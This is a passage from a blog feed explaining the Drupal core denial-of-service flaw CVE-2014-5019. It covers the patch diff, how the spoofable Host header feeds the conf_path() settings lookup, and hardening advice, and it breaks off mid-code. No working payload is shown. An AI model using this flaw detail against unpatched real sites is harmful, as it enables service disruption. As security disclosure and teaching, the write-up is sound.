&lt;li&gt;&lt;a href=&quot;https://twitter.com/regilero&quot;&gt;Stay tuned on twitter, @regilero&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/makinacorpus&quot;&gt;@makinacorpus&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
				<published>2014-10-30 00:00:00 +0100</published>
				<link>http://regilero.github.io/english/drupal/2014/10/30/drupal-nginx_apache_php-fpm-guide/</link>
			</item>
		
			<item>
				<title>Details of DRUPAL_SA_CORE_2014_003 Deny Of Service</title>
				<description>&lt;p&gt;&lt;small&gt;&lt;strong&gt;English version&lt;/strong&gt; (&lt;strong&gt;Version Française&lt;/strong&gt; disponible sur &lt;a href=&quot;http://makina-corpus.com/blog/metier/2014/details-of-drupal_sa_core_2014_003&quot;&gt;makina corpus&lt;/a&gt;.)&lt;/small&gt;&lt;/p&gt;

&lt;h2&gt;SA_CORE_2014_003&lt;/h2&gt;

&lt;p&gt;This summer Drupal versions &lt;a href=&quot;https://www.drupal.org/drupal-6.32-release-notes&quot;&gt;6.x&lt;/a&gt; and &lt;a href=&quot;https://www.drupal.org/drupal-7.29-release-notes&quot;&gt;7.29&lt;/a&gt; &amp;amp; &lt;a href=&quot;https://www.drupal.org/drupal-7.31-release-notes&quot;&gt;7.31&lt;/a&gt; have been released with some critical security fixs. Enough time as passed, so I will give some details one of the issues from &lt;a href=&quot;https://www.drupal.org/SA-CORE-2014-003&quot;&gt;SA-CORE-2014-003 - Drupal core - Multiple vulnerabilities&lt;/a&gt;. It contains 3 issues. The one we will study here is the Core &lt;strong&gt;Deny of Service&lt;/strong&gt; (DOS) issue which is also available in the CVE database as &lt;a href=&quot;http://www.cvedetails.com/cve/CVE-2014-5019/&quot;&gt;CVE-2014-5019&lt;/a&gt;. This post is a detailled explanation of how drupal is using the Host header of the http request to find the configuration file, and why this was usable in a deny of service attack even for websites not using the multisite feature. It contains some not very well known things on Host header manipulations, so I hope this will help other projects from avoiding theses issues.&lt;/p&gt;

&lt;p&gt;Note that there were a regression in Drupal 7.29, with images and files attached to taxonomy terms which has been fixed on the next release 7.30 (the regression was not about the patch discussed here).&lt;/p&gt;

&lt;p&gt;Note also that another core security issue has been fixed right after this one (&lt;a href=&quot;https://www.drupal.org/SA-CORE-2014-004&quot;&gt;SA-CORE-2014-004 - Drupal core - Multiple vulnerabilities&lt;/a&gt;, which was another DOS issue coming from &lt;code&gt;xmlrpc.php&lt;/code&gt;, so if you do not have something preventing remote access to this php file you should really upgrade your drupal code version to version &lt;code&gt;7.31&lt;/code&gt;. My own advice is to alter your Apache/Nginx configuration to only allow one PHP file, &lt;code&gt;index.php&lt;/code&gt;, this will prevent a loooot of problems.&lt;/p&gt;

&lt;p&gt;If you have some fears on updating the Core you can at least apply &lt;a href=&quot;https://www.drupal.org/files/issues/sec-D7-conf-path-dos-105258-23.patch&quot;&gt;the DOS patch&lt;/a&gt; for this first DOS issue (this is not the patch for the xmlrpc.php issue), which is quite simple:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;diff --git a/includes/bootstrap.inc b/includes/bootstrap.inc
index 0b81dc0..dc08dd6 100644
--- a/includes/bootstrap.inc
+++ b/includes/bootstrap.inc
@@ -700,7 +700,14 @@ function drupal_environment_initialize() {
  *  TRUE if only containing valid characters, or FALSE otherwise.
  */
 function drupal_valid_http_host($host) {
-  return preg_match('/^\[?(?:[a-zA-Z0-9-:\]_]+\.?)+$/', $host);
+  // Limit the length of the host name to 1000 bytes to prevent DoS attacks with
+  // long host names.
+  return strlen($host) &amp;lt;= 1000
+    // Limit the number of subdomains and port separators to prevent DoS attacks
+    // in conf_path().
+    &amp;amp;&amp;amp; substr_count($host, '.') &amp;lt;= 100
+    &amp;amp;&amp;amp; substr_count($host, ':') &amp;lt;= 100
+    &amp;amp;&amp;amp; preg_match('/^\[?(?:[a-zA-Z0-9-:\]_]+\.?)+$/', $host);
 }
&lt;/code&gt;&lt;/pre&gt;

&lt;h2&gt;So, what was the problem?&lt;/h2&gt;

&lt;h3&gt;Spoofable Hostnames&lt;/h3&gt;

&lt;p&gt;By simply checking the patch we can see that the goal is to prevent :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;hostnames longer than 1000 characters&lt;/li&gt;
&lt;li&gt;hostnames with more than 100 dots (or subdomains)&lt;/li&gt;
&lt;li&gt;hostnames with more than 100 &lt;code&gt;:&lt;/code&gt; (used on ports and sometimes for IPv6)&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;The &lt;strong&gt;hostname&lt;/strong&gt; is a very important part of the client HTTP request. When you are requesting a website, which could be a drupal website, your client HTTP request will send several headers and on of theses headers is the hostname, it is the &lt;strong&gt;Host:&lt;/strong&gt; header:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET /page/foo?z=42 HTTP/1.1
Host: www.example.com
(other headers)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The HTTP server receiving this request will decide which VirtualHost will have to handle the request, usually using the Host header to choose between several VirtualHosts (sometimes a same HTTP server is used to manage hundreds of websites). Usually this Host header should contain your website &lt;strong&gt;DNS&lt;/strong&gt;. This header is required for HTTP/1.1 and can also be used with HTTP/1.0.&lt;/p&gt;

&lt;p&gt;But this header is &lt;strong&gt;spoofable&lt;/strong&gt; by the client, so it could contain anything. Hopefully (or at least that's what you usually hope) having a bad Host header should prevent the request from reaching your valid Drupal installation because of several facts:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;really bad injections (like null-bytes) are detected by the HTTP server and the connection is closed&lt;/li&gt;
&lt;li&gt;Headers cannot use more than 8000 characters (more or less), this limits the size of the spoofed header (but, hey, 8000 is quite huge)&lt;/li&gt;
&lt;li&gt;unrecognized hostnames goes to the default Virtualhost, which may not be your Drupal website&lt;/li&gt;
&lt;li&gt;Drupal also ensure this Hostname only contains a small subset of valid characters&lt;/li&gt;
&lt;li&gt;multiple Host headers are concatenated with &lt;code&gt;,&lt;/code&gt; (comma and space -- and drupal rejects spaces in headers)&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;In 2013 an excellent paper on &lt;a href=&quot;http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html&quot;&gt;Practical Host headers attacks&lt;/a&gt; have been published by &lt;a href=&quot;https://plus.google.com/+JamesKettle/about&quot;&gt;James Kettle&lt;/a&gt; and we can see several very important facts in this paper:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;the &lt;strong&gt;default Virtualhost protection does not work&lt;/strong&gt;, more on that at the end of this page. This is valid for both &lt;strong&gt;Nginx&lt;/strong&gt; and &lt;strong&gt;Apache&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;any application having too much trust on this spoofable Header may suffers from issues.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;This paper was studied by the drupal security team, &lt;a href=&quot;https://www.drupal.org/node/2221699&quot;&gt;you can check the discussions here&lt;/a&gt;, and one fact to remember about this discussion is that &lt;strong&gt;you should always enforce the &lt;code&gt;$base_url&lt;/code&gt; setting&lt;/strong&gt; when running Drupal in production to avoid attacks based on password renewable mails.&lt;/p&gt;

&lt;p&gt;So far so good, no real problems.&lt;/p&gt;

&lt;h3&gt;conf_path() settings file search&lt;/h3&gt;

&lt;p&gt;Drupal already had a &lt;code&gt;drupal_valid_http_host&lt;/code&gt; function ensuring the hostnames did not contain bad characters like &lt;code&gt;/&lt;/code&gt;,&lt;code&gt;\&lt;/code&gt;,&lt;code&gt;%&lt;/code&gt;,&lt;code&gt;&lt;/code&gt; or &lt;code&gt;&amp;amp;&lt;/code&gt;. Only letters, digits, dots and &lt;code&gt;:&lt;/code&gt;. Not relying on the HTTP server to ensure a really clean Hostname, always good to add some security layers in the application.&lt;/p&gt;

&lt;p&gt;This was a good security point, because this hostname is used in &lt;code&gt;conf_path()&lt;/code&gt; function, and this is a very early function in the drupal bootstraping process.&lt;/p&gt;

&lt;p&gt;One of the early step done while bootstraping Drupal is to load the configuration file. This file will give you, for example, access to the database, or the &lt;code&gt;$base_url&lt;/code&gt; enforced setting.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;sd&quot;&gt;/**&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;     * Sets the base URL, cookie domain, and session name from configuration.&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;     */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;drupal_settings_initialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$base_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$base_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$base_root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
      &lt;span class=&quot;c1&quot;&gt;// Export these settings.php variables to the global namespace.&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$databases&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cookie_domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$installed_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$update_free_access&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db_prefix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$drupal_hash_salt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$is_https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$base_secure_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$base_insecure_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DRUPAL_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;conf_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/settings.php&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;include_once&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DRUPAL_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;conf_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/settings.php&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Here we see that the settings path depends on the &lt;code&gt;conf_path()&lt;/code&gt; call. This function is quite short, there's a &lt;code&gt;drupal_static&lt;/code&gt; thing which is simply a way to avoid re-doing stuff after the first call (in the same HTTP request), it's basically a lazy-loading-run-only-once shortcut.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;conf_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$require_settings&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$reset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;drupal_static&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__FUNCTION__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$reset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&amp;lt;-- here is the run-only-once thing I was talking about&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
      &lt;span class=&quot;nv&quot;&gt;$confdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;sites&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
      &lt;span class=&quot;nv&quot;&gt;$sites&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DRUPAL_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$confdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/sites.php&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// This will overwrite $sites with the desired mappings.&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DRUPAL_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$confdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/sites.php&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
      &lt;span class=&quot;nv&quot;&gt;$uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;SCRIPT_NAME&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;SCRIPT_NAME&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;SCRIPT_FILENAME&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;implode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rtrim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;HTTP_HOST&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))));&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;implode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;implode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sites&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DRUPAL_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$confdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sites&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sites&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DRUPAL_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$confdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/settings.php&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$require_settings&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DRUPAL_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$confdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
